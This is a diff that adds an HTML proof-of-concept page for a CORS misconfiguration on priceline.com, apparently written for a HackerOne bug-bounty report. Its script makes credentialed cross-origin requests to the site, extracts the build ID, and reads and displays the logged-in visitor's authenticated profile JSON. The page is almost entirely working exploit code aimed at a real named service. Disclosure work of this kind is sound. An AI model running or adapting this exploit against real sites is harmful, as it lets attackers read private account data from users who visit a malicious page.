@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Priceline CORS PoC</title>
+  <style>body{font-family:monospace;padding:20px;max-width:1000px}pre{background:#f4f4f4;padding:15px;overflow:auto;white-space:pre-wrap;word-break:break-all}</style>
+</head>
+<body>
+  <h1>Priceline CORS Misconfiguration PoC</h1>
+  <p><strong>Reporter:</strong> sshabib via HackerOne</p>
+  <p><strong>Attacker origin:</strong> <span id="origin"></span></p>
+  <p><strong>Target endpoint:</strong> www.priceline.com/next-profile/_next/data/&lt;buildId&gt;/profile.json</p>
+  <hr>
+  <h2>Result</h2>
+  <p>Status: <span id="status">pending...</span></p>
+  <h3>Authenticated response body (read cross-origin with credentials):</h3>
+  <pre id="output">Fetching...</pre>
+
+  <script>
+    document.getElementById('origin').innerText = window.location.origin;
+
+    fetch('https://www.priceline.com/', { credentials: 'include' })
+      .then(r => r.text())
+      .then(html => {
+        const match = html.match(/"buildId":"([^"]+)"/);
+        if (!match) throw new Error('Could not extract buildId from priceline.com');
+        const buildId = match[1];
+        document.getElementById('output').innerText = 'Build ID extracted: ' + buildId + '\n\nFetching profile...';
+
+        return fetch('https://www.priceline.com/next-profile/_next/data/' + buildId + '/profile.json', {
+          credentials: 'include',
+          method: 'GET'
+        });
+      })
+      .then(response => {
+        document.getElementById('status').innerText = response.status + ' ' + response.statusText;
+        return response.text();
+      })
+      .then(body => {
+        document.getElementById('output').innerText = body;
+      })
+      .catch(err => {
+        document.getElementById('output').innerText = 'ERROR: ' + err.message;
+      });
+  </script>
+</body>
+</html>
